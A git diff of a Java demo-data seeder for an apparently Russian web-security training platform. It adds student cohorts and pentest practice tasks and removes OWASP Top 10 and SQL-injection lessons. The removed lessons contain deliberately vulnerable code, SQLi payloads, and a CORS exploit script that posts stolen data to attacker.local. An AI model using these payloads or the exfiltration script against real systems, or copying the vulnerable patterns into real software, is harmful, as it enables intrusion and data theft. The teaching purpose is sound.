@@ -1,5 +1,6 @@
 package ru.pep.platform.config;
 
+import java.time.OffsetDateTime;
 import java.util.List;
 import java.util.Map;
 import java.util.function.Function;
@@ -15,11 +16,22 @@ import ru.pep.platform.domain.CourseStatus;
 import ru.pep.platform.domain.LearningModule;
 import ru.pep.platform.domain.Lesson;
 import ru.pep.platform.domain.ModuleStatus;
+import ru.pep.platform.domain.PentestTask;
 import ru.pep.platform.domain.Role;
+import ru.pep.platform.domain.StudentStream;
+import ru.pep.platform.domain.StudentStreamCourse;
+import ru.pep.platform.domain.StudentStreamMembership;
+import ru.pep.platform.domain.StudentStreamModuleSchedule;
+import ru.pep.platform.domain.StudentStreamStatus;
 import ru.pep.platform.repository.AppUserRepository;
 import ru.pep.platform.repository.CourseRepository;
 import ru.pep.platform.repository.LearningModuleRepository;
 import ru.pep.platform.repository.LessonRepository;
+import ru.pep.platform.repository.PentestTaskRepository;
+import ru.pep.platform.repository.StudentStreamCourseRepository;
+import ru.pep.platform.repository.StudentStreamMembershipRepository;
+import ru.pep.platform.repository.StudentStreamModuleScheduleRepository;
+import ru.pep.platform.repository.StudentStreamRepository;
 
 @Configuration
 @ConditionalOnProperty(prefix = "pep.demo-data", name = "enabled", havingValue = "true")
@@ -31,12 +43,18 @@ public class DemoDataInitializer {
             CourseRepository courses,
             LearningModuleRepository modules,
             LessonRepository lessons,
+            PentestTaskRepository pentestTasks,
+            StudentStreamRepository streams,
+            StudentStreamCourseRepository streamCourses,
+            StudentStreamMembershipRepository streamMembers,
+            StudentStreamModuleScheduleRepository streamSchedules,
             PasswordEncoder passwordEncoder) {
         return args -> {
-            createUser(users, passwordEncoder, "admin@pep.local", "admin", "Администратор", Role.ADMIN);
+            AppUser admin = createUser(users, passwordEncoder, "admin@pep.local", "admin", "Администратор", Role.ADMIN);
             createUser(users, passwordEncoder, "curator@pep.local", "curator", "Куратор", Role.CURATOR);
-            createUser(users, passwordEncoder, "student1@pep.local", "student", "Студент 1", Role.STUDENT);
-            createUser(users, passwordEncoder, "student2@pep.local", "student", "Студент 2", Role.STUDENT);
+            AppUser student1 = createUser(users, passwordEncoder, "student1@pep.local", "student", "Студент 1", Role.STUDENT);
+            AppUser student2 = createUser(users, passwordEncoder, "student2@pep.local", "student", "Студент 2", Role.STUDENT);
+            AppUser student3 = createUser(users, passwordEncoder, "student3@pep.local", "student", "Студент 3", Role.STUDENT);
 
             LearningModule dockerModule = ensureModule(
                     courses,
@@ -49,7 +67,105 @@ public class DemoDataInitializer {
 
             archiveLegacySecurityCourses(courses);
             seedSecurityAcademyModules(courses, modules, lessons);
+            seedPracticeTasks(pentestTasks);
+
+            seedStudentStreams(
+                    streams,
+                    streamCourses,
+                    streamMembers,
+                    streamSchedules,
+                    courses,
+                    modules,
+                    admin,
+                    student1,
+                    student2,
+                    student3);
         };
+    }
+
+    private void seedStudentStreams(
+            StudentStreamRepository streams,
+            StudentStreamCourseRepository streamCourses,
+            StudentStreamMembershipRepository streamMembers,
+            StudentStreamModuleScheduleRepository streamSchedules,
+            CourseRepository courses,
+            LearningModuleRepository modules,
+            AppUser admin,
+            AppUser student1,
+            AppUser student2,
+            AppUser student3) {
+        Course webAcademy = courses.findByTitle("Академия веб-безопасности").orElse(null);
+        Course docker = courses.findByTitle("Вводный курс по Docker").orElse(null);
+
+        StudentStream webStream = streams.findByName("web-academy-2026-1")
+                .orElseGet(() -> streams.save(new StudentStream(
+                        "web-academy-2026-1",
+                        null,
+                        StudentStreamStatus.ACTIVE,
+                        admin)));
+        StudentStream dockerStream = streams.findByName("docker-intro-2026-1")
+                .orElseGet(() -> streams.save(new StudentStream(
+                        "docker-intro-2026-1",
+                        null,
+                        StudentStreamStatus.ACTIVE,
+                        admin)));
+
+        if (webAcademy != null) {
+            ensureStreamCourse(streamCourses, webStream, webAcademy, 0);
+            OffsetDateTime now = OffsetDateTime.now();
+            List<LearningModule> webModules = modules.findByCourseId(webAcademy.getId());
+            for (LearningModule module : webModules) {
+                ensureSchedule(streamSchedules, webStream, module,
+                        now.minusDays(7), now.plusDays(21), now.plusDays(14), now.plusDays(28));
+            }
+        }
+        if (docker != null) {
+            ensureStreamCourse(streamCourses, dockerStream, docker, 0);
+            OffsetDateTime now = OffsetDateTime.now();
+            List<LearningModule> dockerModules = modules.findByCourseId(docker.getId());
+            for (LearningModule module : dockerModules) {
+                ensureSchedule(streamSchedules, dockerStream, module,
+                        now.minusDays(14), now.plusDays(7), now.plusDays(3), now.plusDays(10));
+            }
+        }
+
+        ensureMembership(streamMembers, webStream, student1);
+        ensureMembership(streamMembers, webStream, student2);
+        ensureMembership(streamMembers, dockerStream, student1);
+        ensureMembership(streamMembers, dockerStream, student3);
+    }
+
+    private void ensureStreamCourse(
+            StudentStreamCourseRepository repo,
+            StudentStream stream,
+            Course course,
+            int position) {
+        if (repo.findByStreamAndCourse(stream, course).isEmpty()) {
+            repo.save(new StudentStreamCourse(stream, course, position));
+        }
+    }
+
+    private void ensureMembership(
+            StudentStreamMembershipRepository repo,
+            StudentStream stream,
+            AppUser student) {
+        if (repo.findByStreamAndUser(stream, student).isEmpty()) {
+            repo.save(new StudentStreamMembership(stream, student));
+        }
+    }
+
+    private void ensureSchedule(
+            StudentStreamModuleScheduleRepository repo,
+            StudentStream stream,
+            LearningModule module,
+            OffsetDateTime startsAt,
+            OffsetDateTime submissionDeadline,
+            OffsetDateTime blackBoxStartsAt,
+            OffsetDateTime blackBoxDeadline) {
+        StudentStreamModuleSchedule schedule = repo.findByStreamAndModule(stream, module)
+                .orElseGet(() -> new StudentStreamModuleSchedule(stream, module));
+        schedule.applySchedule(startsAt, submissionDeadline, blackBoxStartsAt, blackBoxDeadline);
+        repo.save(schedule);
     }
 
     private void archiveLegacySecurityCourses(CourseRepository courses) {
@@ -317,6 +433,146 @@ public class DemoDataInitializer {
                     seed.topic());
             upsertLesson(lessons, module, 1, seed.title() + ": полный разбор", securityLesson(seed));
         }
+    }
+
+    private void seedPracticeTasks(PentestTaskRepository tasks) {
+        List<PracticeTaskSeed> categories = List.of(
+                new PracticeTaskSeed("SQL-инъекции", "sqli", "авторизация, поиск и фильтры с SQL-параметрами"),
+                new PracticeTaskSeed("Межсайтовое выполнение сценариев", "xss", "отражение и хранение пользовательского HTML/JS"),
+                new PracticeTaskSeed("Инъекция в серверные шаблоны", "ssti", "рендер серверных шаблонов из пользовательских данных"),
+                new PracticeTaskSeed("Подделка серверных запросов", "ssrf", "запросы backend к пользовательским URL"),
+                new PracticeTaskSeed("Межсайтовая подделка запроса", "csrf", "изменение состояния по cookie без защиты токеном"),
+                new PracticeTaskSeed("Ошибки настройки CORS", "cors", "доверие чужому origin и ответы с credentials"),
+                new PracticeTaskSeed("Внешние сущности XML", "xxe", "разбор XML с DTD и внешними сущностями"),
+                new PracticeTaskSeed("Уязвимости бизнес-логики", "business-logic", "обход шагов и инвариантов процесса"),
+                new PracticeTaskSeed("Нарушение управления доступом", "bac", "доступ к административным действиям без роли"),
+                new PracticeTaskSeed("Небезопасные прямые ссылки на объекты", "idor", "чужие объекты через подмену идентификатора"));
+        List<PracticeVariantSeed> variants = List.of(
+                new PracticeVariantSeed(
+                        "exploit",
+                        "easy",
+                        "базовая эксплуатация",
+                        "Эксплуатация уязвимости",
+                        "Найдите уязвимость в базовом endpoint и покажите минимальный воспроизводимый payload.",
+                        "Добавьте в отчет исходный запрос и измененный запрос с объяснением эффекта."),
+                new PracticeVariantSeed(
+                        "blackbox",
+                        "medium",
+                        "слепой black-box сценарий",
+                        "Black-box исследование",
+                        "Проведите проверку только через HTTP-запросы и поведение сервера без чтения исходного кода.",
+                        "Зафиксируйте признаки уязвимости и обоснование влияния на безопасность."),
+                new PracticeVariantSeed(
+                        "fix-check",
+                        "hard",
+                        "проверка исправления",
+                        "Верификация защиты",
+                        "Покажите, как воспроизвести дефект до исправления и как подтвердить, что после фикса сценарий больше не работает.",
+                        "Приложите негативный тест и критерий приемки для защищенной версии."));
+        long projectId = -1;
+        for (PracticeTaskSeed category : categories) {
+            for (PracticeVariantSeed variant : variants) {
+                String slug = category.slugPrefix() + "-" + variant.slugSuffix();
+                String title = category.category() + ": " + variant.titleSuffix();
+                seedPracticeTask(
+                        tasks,
+                        projectId--,
+                        category.category(),
+                        slug,
+                        title,
+                        variant.difficulty(),
+                        practiceTaskDescription(category, variant));
+            }
+        }
+    }
+
+    private void seedPracticeTask(
+            PentestTaskRepository tasks,
+            long projectId,
+            String category,
+            String slug,
+            String title,
+            String difficulty,
+            String description) {
+        String commitSha = "00000000" + Integer.toHexString(description.hashCode()).replace("-", "0");
+        commitSha = commitSha.substring(commitSha.length() - 8);
+        String resolvedCommitSha = commitSha;
+        PentestTask task = tasks.findBySlug(slug)
+                .orElseGet(() -> new PentestTask(
+                        projectId,
+                        "local/" + slug,
+                        title,
+                        slug,
+                        category,
+                        difficulty,
+                        240,
+                        8080,
+                        "/health",
+                        null,
+                        description,
+                        "workspace:examples/pentest-tasks/generic-web",
+                        "main",
+                        resolvedCommitSha,
+                        Integer.toHexString(description.hashCode())));
+        task.updateFromManifest(
+                title,
+                slug,
+                category,
+                difficulty,
+                240,
+                8080,
+                "/health",
+                null,
+                description,
+                "workspace:examples/pentest-tasks/generic-web",
+                "main",
+                commitSha,
+                Integer.toHexString(description.hashCode()),
+                "Разбор примера");
+        // API list returns only ARCHIVE / PROMOTED_FROM_STAND tasks (см. PentestTaskService.isSupportedTaskSource),
+        // и V21 удаляет любые GITLAB-задачи. Помечаем сидовые лабораторные как архивные с READY-статусом,
+        // чтобы они были видны в карточках модулей.
+        task.markAsSeededArchive("workspace:examples/pentest-tasks/generic-web");
+        tasks.save(task);
+    }
+
+    private String practiceTaskDescription(PracticeTaskSeed category, PracticeVariantSeed variant) {
+        return """
+                ### Тип задачи
+
+                **%s**
+
+                ### Цель
+
+                Запустите учебный стенд по теме **%s** и выполните сценарий: %s
+
+                ### Фокус проверки
+
+                - зона риска: %s;
+                - работайте по методике соответствующего модуля Академии веб-безопасности;
+                - зафиксируйте только безопасные учебные payloads в рамках выделенного стенда.
+
+                ### Что приложить в отчет
+
+                %s
+                """.formatted(
+                variant.taskType(),
+                category.category(),
+                variant.objective(),
+                category.focusArea(),
+                variant.reportRequirement());
+    }
+
+    private record PracticeTaskSeed(String category, String slugPrefix, String focusArea) {
+    }
+
+    private record PracticeVariantSeed(
+            String slugSuffix,
+            String difficulty,
+            String titleSuffix,
+            String taskType,
+            String objective,
+            String reportRequirement) {
     }
 
     private String securityLesson(SecurityModuleSeed seed) {
@@ -622,295 +878,6 @@ public class DemoDataInitializer {
         return "GET /api/reports/2 HTTP/1.1\\nCookie: session=student-one";
     }
 
-    private void seedOwaspTop10Modules(
-            CourseRepository courses,
-            LearningModuleRepository modules,
-            LessonRepository lessons) {
-        List<OwaspModuleSeed> owaspModules = List.of(
-                new OwaspModuleSeed(
-                        "A01. Broken Access Control",
-                        "Broken Access Control",
-                        "ошибки проверки владельца объекта, IDOR и обход ролей",
-                        "создайте приложение, где пользователь может получить чужую запись по предсказуемому ID",
-                        "проверьте прямой доступ к чужим объектам, изменение ID в URL и отсутствие role checks",
-                        """
-                                app.get('/api/orders/:id', requireLogin, async (req, res) => {
-                                  const order = await db.orders.findById(req.params.id);
-                                  res.json(order);
-                                });
-                                """,
-                        "Код проверяет только факт входа, но не проверяет, что заказ принадлежит текущему пользователю.",
-                        "Сравнивайте `order.userId` с `req.user.id`, а для ролей используйте server-side authorization policy."),
-                new OwaspModuleSeed(
-                        "A02. Cryptographic Failures",
-                        "Cryptographic Failures",
-                        "небезопасное хранение секретов, слабое хеширование и отсутствие защиты чувствительных данных",
-                        "создайте приложение, где секрет хранится открыто или пароль хешируется слабым алгоритмом",
-                        "ищите утечки секретов, слабые reset flows и данные, передаваемые без должной защиты",
-                        """
-                                const passwordHash = crypto
-                                  .createHash('md5')
-                                  .update(req.body.password)
-                                  .digest('hex');
-                                await db.users.insert({ email, passwordHash, cardNumber: req.body.cardNumber });
-                                """,
-                        "MD5 быстро перебирается, а чувствительный номер карты сохраняется без шифрования и минимизации.",
-                        "Используйте Argon2/bcrypt для паролей, не храните лишние PAN/секреты, шифруйте необходимые поля."),
-                new OwaspModuleSeed(
-                        "A04. Insecure Design",
-                        "Insecure Design",
-                        "ошибки бизнес-логики и workflow, которые не исправляются одной input validation",
-                        "создайте сценарий обхода лимита, статуса заказа или обязательного шага процесса",
-                        "проверьте пропуск шагов workflow, повтор операций и изменение состояния не по правилам",
-                        """
-                                app.post('/api/coupon/apply', requireLogin, async (req, res) => {
-                                  const cart = await db.carts.current(req.user.id);
-                                  cart.total = cart.total - Number(req.body.discount);
-                                  await db.carts.save(cart);
-                                  res.json(cart);
-                                });
-                                """,
-                        "Клиент сам задает размер скидки, а сервер не проверяет бизнес-правила купона.",
-                        "Храните правила скидок на сервере, проверяйте ownership, статус, лимиты применения и идемпотентность."),
-                new OwaspModuleSeed(
-                        "A05. Security Misconfiguration",
-                        "Security Misconfiguration",
-                        "debug endpoints, default credentials, лишние headers и открытые админские функции",
-                        "создайте приложение с включенным debug endpoint или тестовыми учетными данными",
-                        "ищите default credentials, debug output, stack traces и открытые actuator/admin paths",
-                        """
-                                app.get('/debug/config', (req, res) => {
-                                  res.json(process.env);
-                                });
-
-                                app.use((error, req, res, next) => {
-                                  res.status(500).send(error.stack);
-                                });
-                                """,
-                        "Endpoint раскрывает секреты окружения, а обработчик ошибок возвращает stack trace пользователю.",
-                        "Отключайте debug в production, фильтруйте секреты, возвращайте нейтральные ошибки и настройте headers."),
-                new OwaspModuleSeed(
-                        "A06. Vulnerable and Outdated Components",
-                        "Vulnerable Components",
-                        "риски устаревших библиотек, frameworks и container base images",
-                        "создайте учебный пример с устаревшей зависимостью и опишите публичное CVE",
-                        "проверьте версии библиотек, package metadata, headers и признаки устаревшего framework",
-                        """
-                                // package.json
-                                {
-                                  "dependencies": {
-                                    "lodash": "4.17.11",
-                                    "express": "4.16.0"
-                                  }
-                                }
-                                """,
-                        "Приложение зависит от старых версий библиотек с публично известными уязвимостями.",
-                        "Фиксируйте SCA-процесс, обновляйте зависимости, используйте lockfile, SBOM и image scanning."),
-                new OwaspModuleSeed(
-                        "A07. Identification and Authentication Failures",
-                        "Authentication Failures",
-                        "слабые пароли, predictable reset tokens и небезопасные session settings",
-                        "создайте reset token, который можно предсказать или перебрать в учебном scope",
-                        "проверьте reset flows, session fixation, weak password policy и predictable tokens",
-                        """
-                                app.post('/reset/start', async (req, res) => {
-                                  const token = String(Math.floor(Math.random() * 1000000));
-                                  await db.resetTokens.save({ email: req.body.email, token });
-                                  res.json({ resetToken: token });
-                                });
-                                """,
-                        "Токен короткий, предсказуемый и возвращается клиенту; перебор занимает мало времени.",
-                        "Используйте криптографически стойкие токены, TTL, rate limiting, audit и не раскрывайте token в ответе."),
-                new OwaspModuleSeed(
-                        "A08. Software and Data Integrity Failures",
-                        "Integrity Failures",
-                        "доверие к неподписанным данным, insecure deserialization и небезопасные update flows",
-                        "создайте endpoint, который доверяет неподписанному JSON/cookie payload",
-                        "проверьте подмену client-side данных, unsigned tokens и отсутствие integrity checks",
-                        """
-                                app.use((req, res, next) => {
-                                  const profile = JSON.parse(Buffer.from(req.cookies.profile, 'base64').toString());
-                                  req.user = profile;
-                                  next();
-                                });
-                                """,
-                        "Сервер доверяет неподписанной cookie, поэтому пользователь может подменить роль или идентификатор.",
-                        "Подписывайте и проверяйте целостность данных, а роли и права загружайте с сервера."),
-                new OwaspModuleSeed(
-                        "A09. Security Logging and Monitoring Failures",
-                        "Logging and Monitoring Failures",
-                        "отсутствие событий безопасности, audit trail и сигналов для обнаружения атак",
-                        "создайте сценарий атаки, который проходит без полезной записи в логах",
-                        "проверьте, фиксируются ли login failures, access denied, report actions и подозрительные payloads",
-                        """
-                                app.post('/login', async (req, res) => {
-                                  const user = await authenticate(req.body.email, req.body.password);
-                                  if (!user) return res.status(403).json({ error: 'bad credentials' });
-                                  res.json({ ok: true });
-                                });
-                                """,
-                        "Отказ входа не пишет security event, поэтому brute force и credential stuffing незаметны.",
-                        "Логируйте auth failures, access denied, изменения прав и подозрительные payloads без записи паролей."),
-                new OwaspModuleSeed(
-                        "A10. Server-Side Request Forgery",
-                        "SSRF",
-                        "серверные запросы к URL, controlled by user, и риск доступа к internal resources",
-                        "создайте безопасный учебный SSRF endpoint с allowlisted локальной целью",
-                        "проверьте URL fetch endpoints, redirects, private IP ranges и bypass allowlist",
-                        """
-                                app.get('/preview', async (req, res) => {
-                                  const response = await fetch(req.query.url);
-                                  res.send(await response.text());
-                                });
-                                """,
-                        "Сервер делает запрос к произвольному URL и может обратиться к internal metadata или private network.",
-                        "Используйте allowlist hostnames, запрет private IP ranges, запрет redirects и egress controls."));
-
-        for (OwaspModuleSeed seed : owaspModules) {
-            LearningModule module = ensureModule(
-                    courses,
-                    modules,
-                    "OWASP Top 10",
-                    "Практический курс по базовым классам web-уязвимостей.",
-                    seed.title(),
-                    seed.topic());
-            seedGenericOwaspLessons(lessons, module, seed);
-        }
-    }
-
-    private void seedWebSecurityAcademyModules(
-            CourseRepository courses,
-            LearningModuleRepository modules,
-            LessonRepository lessons) {
-        LearningModule corsModule = ensureModule(
-                courses,
-                modules,
-                "Web Security Academy",
-                "Длинные практические материалы в стиле PortSwigger: одна страница, много разделов и якорные ссылки.",
-                "CORS",
-                "CORS misconfiguration");
-        upsertLesson(lessons, corsModule, 1,
-                "CORS: подробный разбор уязвимостей",
-                """
-                        ## What is CORS
-
-                        CORS, или Cross-Origin Resource Sharing, определяет, может ли браузер разрешить JavaScript
-                        с одного origin читать ответ другого origin. Same-Origin Policy по умолчанию запрещает чтение
-                        чужих ответов, но сервер может ослабить это правило с помощью HTTP-заголовков.
-
-                        ## Origin и trust boundary
-
-                        Origin состоит из схемы, host и port. `https://academy.example`, `http://academy.example`
-                        и `https://academy.example:8443` - разные origins. Когда backend возвращает
-                        `Access-Control-Allow-Origin`, он фактически говорит браузеру, каким сайтам можно читать
-                        ответ из JavaScript.
-
-                        ## Typical vulnerable code
-
-                        ```javascript
-                        app.use((req, res, next) => {
-                          const origin = req.headers.origin;
-                          if (origin) {
-                            res.setHeader('Access-Control-Allow-Origin', origin);
-                            res.setHeader('Access-Control-Allow-Credentials', 'true');
-                          }
-                          next();
-                        });
-
-                        app.get('/api/me', requireLogin, async (req, res) => {
-                          res.json({
-                            email: req.user.email,
-                            apiToken: req.user.apiToken
-                          });
-                        });
-                        ```
-
-                        ## Code walkthrough
-
-                        Первая проблема - сервер отражает любой `Origin` обратно в
-                        `Access-Control-Allow-Origin`. Вторая проблема - вместе с этим включен
-                        `Access-Control-Allow-Credentials: true`, поэтому браузер может отправить cookie пользователя
-                        и разрешить чужому сайту прочитать чувствительный JSON-ответ.
-
-                        ## Exploitation idea
-
-                        Атакующий размещает страницу на своем origin и делает запрос к уязвимому приложению:
-
-                        ```html
-                        <script>
-                        fetch('https://target.local/api/me', { credentials: 'include' })
-                          .then(response => response.text())
-                          .then(body => fetch('https://attacker.local/log', {
-                            method: 'POST',
-                            body
-                          }));
-                        </script>
-                        ```
-
-                        В учебном lab вместо реальной эксфильтрации используйте локальный endpoint и тестовые данные.
-                        Цель задания - доказать, что браузер разрешает чтение ответа с cookie пользователя.
-
-                        ## ACAO wildcard
-
-                        `Access-Control-Allow-Origin: *` сам по себе не разрешает credentialed requests. Браузер
-                        заблокирует чтение ответа, если одновременно указан `Access-Control-Allow-Credentials: true`.
-                        Но wildcard все равно опасен для публичных API, если ответ содержит данные, которые не должны
-                        читаться любым сайтом.
-
-                        ## Null origin
-
-                        Некоторые приложения доверяют `Origin: null`, который может появляться у sandboxed documents,
-                        локальных файлов или отдельных browser contexts. Если backend добавляет `null` в allowlist
-                        без анализа сценария, это может стать обходом доверенной модели.
-
-                        ## Regex allowlist mistakes
-
-                        Частая ошибка - проверять origin через `endsWith('trusted.com')`. Тогда
-                        `https://eviltrusted.com` может пройти проверку. Другая ошибка - доверять любому subdomain,
-                        хотя часть subdomains контролируется пользователями или внешними сервисами.
-
-                        ## Testing checklist
-
-                        - отправьте запрос с `Origin: https://attacker.local`;
-                        - проверьте, отражается ли origin в `Access-Control-Allow-Origin`;
-                        - проверьте наличие `Access-Control-Allow-Credentials: true`;
-                        - сравните ответы для trusted, untrusted и `null` origin;
-                        - проверьте endpoints с персональными данными, токенами и настройками профиля;
-                        - не тестируйте реальные домены и не отправляйте чувствительные данные наружу.
-
-                        ## How to prevent
-
-                        Используйте строгий allowlist конкретных origins. Не отражайте `Origin` автоматически.
-                        Не включайте credentials для endpoints, которым это не нужно. Разделяйте публичные API и
-                        персональные API, добавляйте `Vary: Origin`, покрывайте CORS policy тестами и проверяйте
-                        subdomain ownership перед добавлением домена в allowlist.
-
-                        ## Safe implementation
-
-                        ```javascript
-                        const allowedOrigins = new Set([
-                          'https://pep.local',
-                          'https://teacher.pep.local'
-                        ]);
-
-                        app.use((req, res, next) => {
-                          const origin = req.headers.origin;
-                          if (origin && allowedOrigins.has(origin)) {
-                            res.setHeader('Access-Control-Allow-Origin', origin);
-                            res.setHeader('Access-Control-Allow-Credentials', 'true');
-                            res.setHeader('Vary', 'Origin');
-                          }
-                          next();
-                        });
-                        ```
-
-                        ## What to report
-
-                        В отчете покажите HTTP-запрос с вредоносным `Origin`, ответ сервера с CORS-заголовками,
-                        endpoint с чувствительными данными, объяснение роли браузера и исправленную allowlist-политику.
-                        """);
-    }
-
     private LearningModule ensureModule(
             CourseRepository courses,
             LearningModuleRepository modules,
@@ -1005,411 +972,6 @@ public class DemoDataInitializer {
                 3));
     }
 
-    private void seedInjectionLessons(LessonRepository lessons, LearningModule module) {
-        upsertLesson(lessons, module, 1,
-                "Docker image для сдачи на платформе",
-                """
-                        ## Цель урока
-
-                        Научиться готовить приложение как Docker image, который можно отправить на technical validation.
-
-                        ## Минимальные требования
-
-                        - image запускается без ручных действий;
-                        - приложение слушает документированный port `8080`;
-                        - endpoint `/health` возвращает успешный ответ;
-                        - не используется `--privileged`, host network и реальные секреты.
-
-                        ## Команды
-
-                        ```bash
-                        docker build -t vulnerable-sqli-demo:latest ./examples/vulnerable-sqli-demo
-                        docker tag vulnerable-sqli-demo:latest localhost:5001/vulnerable-sqli-demo:latest
-                        docker push localhost:5001/vulnerable-sqli-demo:latest
-                        ```
-                        """);
-        upsertLesson(lessons, module, 2,
-                "A03. Injection: теория и признаки",
-                """
-                        ## Что такое SQL Injection
-
-                        SQL Injection возникает, когда пользовательский ввод встраивается в SQL-команду как часть
-                        синтаксиса, а не передается как параметр. В PortSwigger Web Security Academy эта тема обычно
-                        разбирается через boolean-based, error-based, UNION и blind-подходы; в PEP мы используем
-                        безопасный учебный scope и собственные Docker labs.
-
-                        ## Почему инъекция работает
-
-                        SQL-запрос состоит из структуры и данных. Структура задает таблицы, условия, сортировку,
-                        объединения и подзапросы. Данные должны попадать в заранее подготовленные места. Уязвимость
-                        появляется, когда ввод пользователя становится частью структуры запроса: закрывает строковый
-                        литерал, добавляет оператор `OR`, комментирует остаток запроса или подставляет новый SQL-фрагмент.
-
-                        ## Где обычно появляется уязвимость
-
-                        - формы входа и восстановления пароля;
-                        - поиск по каталогу, фильтры и сортировка;
-                        - страницы деталей по `id`;
-                        - admin-панели с экспортом CSV или отчетами;
-                        - GraphQL/REST endpoints, где параметры напрямую попадают в query builder;
-                        - legacy-код, где SQL собирается через string concatenation.
-
-                        ## Признаки
-
-                        - разные ответы на истинное и ложное условие;
-                        - SQL error при одиночной кавычке;
-                        - изменение количества записей при изменении `WHERE`;
-                        - задержки ответа при time-based payloads в контролируемом lab.
-
-                        ## Базовая методика проверки
-
-                        Начинайте с безопасных, минимальных проверок. Не используйте destructive payloads, не меняйте
-                        данные и не выходите за границы назначенного lab. Для учебного black box сценария достаточно
-                        сравнить реакцию приложения на несколько вариантов одного параметра.
-
-                        ```text
-                        исходный запрос:       /products?category=books
-                        проверка кавычки:      /products?category=books'
-                        истинное условие:      /products?category=books' OR '1'='1
-                        ложное условие:        /products?category=books' AND '1'='2
-                        ```
-
-                        Если истинное условие возвращает обычный или расширенный результат, а ложное резко меняет
-                        ответ, это сильный индикатор boolean-based SQL Injection.
-
-                        ## Boolean-based подход
-
-                        Boolean-based SQL Injection полезна, когда приложение не показывает SQL-ошибку. Тестер меняет
-                        условие так, чтобы база вернула разные результаты для true и false. В отчете нужно показать
-                        пару запросов, различие ответа и объяснить, какая часть payload изменила SQL-логику.
-
-                        ## Error-based подход
-
-                        Error-based подход опирается на сообщения базы данных. В production такие ошибки не должны
-                        попадать пользователю, но в учебном lab они помогают понять тип СУБД и место, где ввод попал
-                        в SQL. В отчете фиксируйте только нейтральный фрагмент ошибки, без реальных секретов.
-
-                        ## UNION-based подход
-
-                        UNION используется для объединения результата исходного запроса с контролируемым результатом.
-                        В учебной среде цель не в извлечении чужих данных, а в доказательстве, что структура запроса
-                        контролируется вводом. Для PEP достаточно показать, что дополнительное значение появляется
-                        в ответе приложения.
-
-                        ## Как оформить evidence
-
-                        Хороший отчет показывает цепочку: endpoint, исходный параметр, payload, различие результата,
-                        уязвимый фрагмент кода и безопасное исправление. Скриншот без объяснения не считается
-                        полноценным evidence, потому что куратор должен понимать корневую причину.
-
-                        ## How to prevent
-
-                        Основная защита - parameterized queries. Значения пользователя должны передаваться отдельно
-                        от SQL-шаблона. Для динамической сортировки используйте allowlist имен колонок, а не подстановку
-                        произвольной строки. Пароли храните как hash и проверяйте отдельно от SQL-условия.
-                        """);
-        upsertLesson(lessons, module, 3,
-                "Уязвимый код: SQL Injection",
-                """
-                        ## Уязвимый пример
-
-                        ```javascript
-                        app.post('/login', async (req, res) => {
-                          const sql = `
-                            SELECT id, email
-                            FROM users
-                            WHERE email = '${req.body.email}'
-                              AND password = '${req.body.password}'
-                          `;
-                          const user = await db.get(sql);
-                          if (!user) return res.status(403).send('Неверный логин или пароль');
-                          res.json(user);
-                        });
-                        ```
-
-                        ## Разбор по строкам
-
-                        В строках с `WHERE email = '${req.body.email}'` и `password = '${req.body.password}'`
-                        пользовательский ввод попадает внутрь SQL без параметризации. Backend не передает значения
-                        как данные, а склеивает итоговый текст запроса. Поэтому payload может закрыть кавычку,
-                        добавить собственное условие и изменить смысл `WHERE`.
-
-                        ```javascript
-                        const sql = `
-                          SELECT id, email
-                          FROM users
-                          WHERE email = '${req.body.email}'
-                            AND password = '${req.body.password}'
-                        `;
-                        ```
-
-                        Если пользователь отправит email `admin@local.host' --`, остаток условия с паролем может быть
-                        закомментирован. Если отправит `' OR '1'='1`, условие может стать истинным для первой записи.
-
-                        Payload для демонстрации:
-
-                        ```text
-                        ' OR '1'='1
-                        ```
-
-                        ## Как меняется SQL
-
-                        До payload приложение ожидает такой запрос:
-
-                        ```sql
-                        SELECT id, email
-                        FROM users
-                        WHERE email = 'student@local.host'
-                          AND password = 'student'
-                        ```
-
-                        После payload структура запроса меняется:
-
-                        ```sql
-                        SELECT id, email
-                        FROM users
-                        WHERE email = '' OR '1'='1'
-                          AND password = 'anything'
-                        ```
-
-                        В зависимости от приоритета операторов и конкретного payload атакующий может обойти проверку
-                        или изменить выборку. Это доказывает, что ввод управляет SQL-логикой.
-
-                        ## Почему это уязвимо
-
-                        Payload закрывает строковый литерал и добавляет собственное условие. Запрос начинает выполнять
-                        логику атакующего, а не только поиск пользователя.
-
-                        ## Вариант уязвимости в search endpoint
-
-                        ```javascript
-                        app.get('/products', async (req, res) => {
-                          const query = req.query.q ?? '';
-                          const rows = await db.all(
-                            `SELECT id, title, price FROM products WHERE title LIKE '%${query}%'`
-                          );
-                          res.json(rows);
-                        });
-                        ```
-
-                        Здесь проблема такая же: параметр `q` находится внутри SQL-текста. Payload может закрыть
-                        шаблон `LIKE`, добавить `UNION SELECT` или изменить условие фильтрации. Даже если endpoint
-                        не связан с авторизацией, impact может затрагивать конфиденциальность каталога и внутренних
-                        данных.
-
-                        ## Неполное исправление
-
-                        Простая замена кавычек или regex-фильтр не является надежной защитой. У разных СУБД есть
-                        разные варианты escaping, encoding и комментариев. Такие фильтры часто ломаются при смене
-                        контекста: строка, число, `LIKE`, `ORDER BY`, JSON operator.
-
-                        ## Безопасное исправление
-
-                        ```javascript
-                        const user = await db.get(
-                          'SELECT id, email FROM users WHERE email = ? AND password_hash = ?',
-                          [req.body.email, passwordHash]
-                        );
-                        ```
-
-                        Используйте parameterized queries, ORM bindings и отдельную безопасную проверку пароля.
-
-                        ## Безопасная сортировка через allowlist
-
-                        Параметризовать имя колонки нельзя так же, как значение. Для `ORDER BY` используйте allowlist:
-
-                        ```javascript
-                        const sortColumns = {
-                          title: 'title',
-                          price: 'price',
-                          createdAt: 'created_at'
-                        };
-                        const sortColumn = sortColumns[req.query.sort] ?? 'title';
-                        const rows = await db.all(
-                          `SELECT id, title, price FROM products ORDER BY ${sortColumn} ASC`
-                        );
-                        ```
-
-                        Здесь пользователь выбирает только ключ из заранее заданного списка, а не произвольный SQL.
-
-                        ## What to report
-
-                        В отчете PEP укажите endpoint, payload, изменившийся SQL-смысл, скриншот или HTTP-ответ,
-                        уязвимый фрагмент кода и исправленную версию с параметризованным запросом.
-                        """);
-        upsertLesson(lessons, module, 4,
-                "White box lab: A03. Injection",
-                """
-                        ## Задание
-
-                        Создайте учебное приложение с одним намеренно уязвимым SQL endpoint. Подходящие варианты:
-
-                        - `/login` с конкатенацией SQL;
-                        - `/products?search=` с unsafe search query;
-                        - `/orders?sort=` с unsafe ORDER BY.
-
-                        ## Что приложить в отчет
-
-                        - endpoint;
-                        - payload;
-                        - evidence успешной эксплуатации;
-                        - уязвимый участок кода;
-                        - рекомендацию использовать parameterized queries.
-                        """);
